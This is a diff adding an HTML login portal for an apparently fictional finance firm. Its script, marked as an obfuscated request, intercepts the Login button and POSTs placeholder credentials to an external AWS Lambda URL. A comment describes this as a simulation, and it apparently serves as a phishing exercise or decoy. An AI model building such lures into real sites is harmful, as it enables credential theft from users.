@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mainnet, Inc.</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="shortcut icon" href="logo.png" type="image/x-icon">
+</head>
+<body>
+    <div class="logo">
+        <img src="logo.png" alt="Logo">
+    </div>
+    <nav class="navbar">
+        <ul>
+            <li><a href="finance_home.html">Home</a></li>
+            <li><a href="finance_about.html">About</a></li>
+            <li><a href="finance_careers.html">Careers</a></li>
+        </ul>
+    </nav>
+    <div class="container zoomed-out fade-in-element">
+        <h1>Client Login Portal</h1>
+    </div>
+    <br>
+    <br>
+    <center>
+    <form class="login-form">
+        <label for="client-id">Client ID</label>
+        <input type="text" id="client-id" name="client-id" required>
+        
+        <label for="email">Email</label>
+        <input type="email" id="email" name="email" required>
+        
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required>
+        
+        <button type="submit" id="loginButton">Login</button>
+    </form>
+    </center>
+
+    <br>
+    <br>
+    <br>
+    <footer>
+        <center>
+            <p class="rights">New York, NY 10005, United States.</p>
+            <p class="rights">Copyright &copy; 2024 Mainnet, Inc. and all affiliated companies. All Rights Reserved.</p>
+        </center>
+        </footer>
+
+    <script>
+        document.getElementById('loginButton').addEventListener('click', function() {
+      // Obfuscated version of sending a request
+      event.preventDefault();
+      var _0xabcdef = function(url) {
+        fetch(url, {
+          method: 'POST',
+          body: JSON.stringify({ username: 'user', password: 'pass' }),
+          headers: { 'Content-Type': 'application/json' }
+        }).then(function(response) {
+          return response.text();
+        }).then(function(text) {
+          console.log('Response received:', text);
+        }).catch(function(error) {
+          console.error('Credentials Error');
+        });
+      };
+      
+      // Simulate the request to a harmless endpoint
+      _0xabcdef('https://hy655qqxvkldjkdf6bedcujjfdxhgm0iwhua.lambda-url.eu-north-1.on.aws/');
+    });
+    </script>
+</body>
+</html>
